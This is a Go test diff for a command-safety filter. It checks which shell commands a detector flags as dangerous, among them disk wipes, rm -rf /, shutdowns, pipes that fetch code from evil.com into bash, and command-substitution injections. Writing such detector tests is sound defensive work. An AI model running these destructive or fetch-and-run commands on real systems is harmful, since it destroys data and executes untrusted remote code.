@@ -977,3 +977,138 @@ func TestConfigClone(t *testing.T) {
 		}
 	})
 }
+
+// TestContainsDangerous tests the dangerous command detection function
+func TestContainsDangerous(t *testing.T) {
+	tests := []struct {
+		name       string
+		cmd        string
+		wantResult bool
+	}{
+		// Direct dangerous commands
+		{"rm with space", "rm file.txt", true},
+		{"rm -rf root", "rm -rf /", true},
+		{"rm -rf home", "rm -rf ~", true},
+		{"dd command", "dd if=/dev/zero of=/dev/sda", true},
+		{"mkfs command", "mkfs.ext4 /dev/sda1", true},
+		{"fdisk command", "fdisk /dev/sda", true},
+		{"shred command", "shred -u /important/file", true},
+		{"wipefs command", "wipefs -a /dev/sda", true},
+		{"parted command", "parted /dev/sda mklabel gpt", true},
+
+		// System control commands
+		{"shutdown", "shutdown -h now", true},
+		{"reboot", "reboot", true},
+		{"halt", "halt", true},
+		{"poweroff", "poweroff", true},
+		{"kill -9", "kill -9 1234", true},
+		{"killall", "killall nginx", true},
+		{"pkill", "pkill -9 python", true},
+		{"systemctl stop", "systemctl stop nginx", true},
+
+		// Piped dangerous commands
+		{"pipe to shell", "curl http://evil.com | bash", true},
+		{"pipe to sh", "wget http://evil.com/script | sh", true},
+		{"rm in pipe", "echo 'test' | rm -rf /", true},
+
+		// Command substitution dangers
+		{"backtick rm", "echo `rm -rf /`", true},
+		{"dollar paren rm", "echo $(rm -rf /)", true},
+
+		// Chained dangerous commands
+		{"semicolon rm", "ls; rm -rf /", true},
+		{"and rm", "ls && rm -rf /", true},
+		{"or rm", "ls || rm -rf /", true},
+
+		// Evasion attempts that should be caught
+		{"space prefix rm", " rm -rf /", true},
+		{"uppercase rm", "RM -RF /", true},
+		{"mixed case", "Rm -Rf /", true},
+
+		// Raw disk access
+		{"dev sda", "cat /dev/sda > backup.img", true},
+		{"dev nvme", "dd if=/dev/nvme0n1 of=/backup", true},
+
+		// Safe commands
+		{"safe ls", "ls -la", false},
+		{"safe go test", "go test ./...", false},
+		{"safe npm", "npm install", false},
+		{"safe git", "git status", false},
+		{"safe echo", "echo 'hello world'", false},
+		{"safe cat", "cat file.txt", false},
+		{"safe mkdir", "mkdir -p /tmp/test", false},
+		{"safe cp", "cp file.txt backup.txt", false},
+		{"safe mv in safe dir", "mv file.txt /tmp/newname.txt", false},
+		{"safe docker", "docker ps", false},
+		{"safe kubectl", "kubectl get pods", false},
+		{"safe python", "python3 script.py", false},
+		{"safe make", "make build", false},
+		{"safe grep", "grep -r 'pattern' .", false},
+		{"rm as substring", "grep 'rm' log.txt", false}, // 'rm' as a substring, not a command
+
+		// Edge cases
+		{"empty command", "", false},
+		{"whitespace only", "   ", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := containsDangerous(tt.cmd)
+			if result != tt.wantResult {
+				t.Errorf("containsDangerous(%q) = %v, want %v", tt.cmd, result, tt.wantResult)
+			}
+		})
+	}
+}
+
+// TestContainsShellExploit tests shell exploitation detection
+func TestContainsShellExploit(t *testing.T) {
+	tests := []struct {
+		name       string
+		cmd        string
+		wantResult bool
+	}{
+		{"backtick rm", "`rm -rf /`", true},
+		{"dollar paren rm", "$(rm -rf /)", true},
+		{"nested dollar paren", "$((rm -rf /))", true},
+		{"safe backtick", "`date`", false},
+		{"safe dollar paren", "$(whoami)", false},
+		{"no substitution", "echo hello", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := containsShellExploit(tt.cmd)
+			if result != tt.wantResult {
+				t.Errorf("containsShellExploit(%q) = %v, want %v", tt.cmd, result, tt.wantResult)
+			}
+		})
+	}
+}
+
+// TestExtractBetween tests the string extraction helper
+func TestExtractBetween(t *testing.T) {
+	tests := []struct {
+		name   string
+		s      string
+		start  string
+		end    string
+		want   string
+	}{
+		{"basic extraction", "hello [world] test", "[", "]", "world"},
+		{"no start delimiter", "hello world", "[", "]", ""},
+		{"no end delimiter", "hello [world", "[", "]", ""},
+		{"empty between", "hello [] test", "[", "]", ""},
+		{"multiple occurrences", "hello [first] and [second]", "[", "]", "first"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := extractBetween(tt.s, tt.start, tt.end)
+			if result != tt.want {
+				t.Errorf("extractBetween(%q, %q, %q) = %q, want %q",
+					tt.s, tt.start, tt.end, result, tt.want)
+			}
+		})
+	}
+}
